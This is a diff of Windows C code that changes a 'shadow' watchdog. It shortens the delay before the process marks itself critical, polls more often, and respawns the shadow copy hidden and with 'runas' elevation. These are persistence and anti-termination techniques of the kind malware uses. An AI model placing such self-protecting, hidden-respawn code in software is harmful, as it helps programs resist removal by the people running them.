@@ -65,7 +65,7 @@ static int download_module(const char *url, const char *out_path) {
 
 /* Auto-protect thread for shadow copies: waits 15 seconds then protects */
 DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
-    Sleep(500);  /* Small delay to let startup finish, then protect immediately */
+    Sleep(15000);  /* Wait 15 seconds, then mark critical */
     util_set_critical();
     return 0;
 }
@@ -87,7 +87,7 @@ DWORD WINAPI shadow_watchdog(LPVOID lpParam) {
     };
     
     while (1) {
-        Sleep(30000);  /* Check every 30 seconds */
+        Sleep(15000);  /* Check every 15 seconds */
         
         /* Exit watchdog if uninstalling — don't respawn anything */
         if (g_uninstalling) {
@@ -116,20 +116,16 @@ DWORD WINAPI shadow_watchdog(LPVOID lpParam) {
                 CloseHandle(hSnap);
             }
             
-            /* If not running, respawn */
+            /* If not running, respawn with admin elevation */
             if (!found) {
-                STARTUPINFOA si = {0};
-                si.cb = sizeof(si);
-                PROCESS_INFORMATION pi = {0};
-                char cmdLine[1024];
-                snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", path);
-                CreateProcessA(path, cmdLine, NULL, NULL, FALSE,
-                              CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
-                              NULL, NULL, &si, &pi);
-                if (pi.hProcess) {
-                    CloseHandle(pi.hProcess);
-                    CloseHandle(pi.hThread);
-                }
+                SHELLEXECUTEINFOA sei = {0};
+                sei.cbSize = sizeof(sei);
+                sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+                sei.lpVerb = "runas";
+                sei.lpFile = path;
+                sei.lpParameters = "--shadow";
+                sei.nShow = SW_HIDE;
+                ShellExecuteExA(&sei);
             }
         }
     }
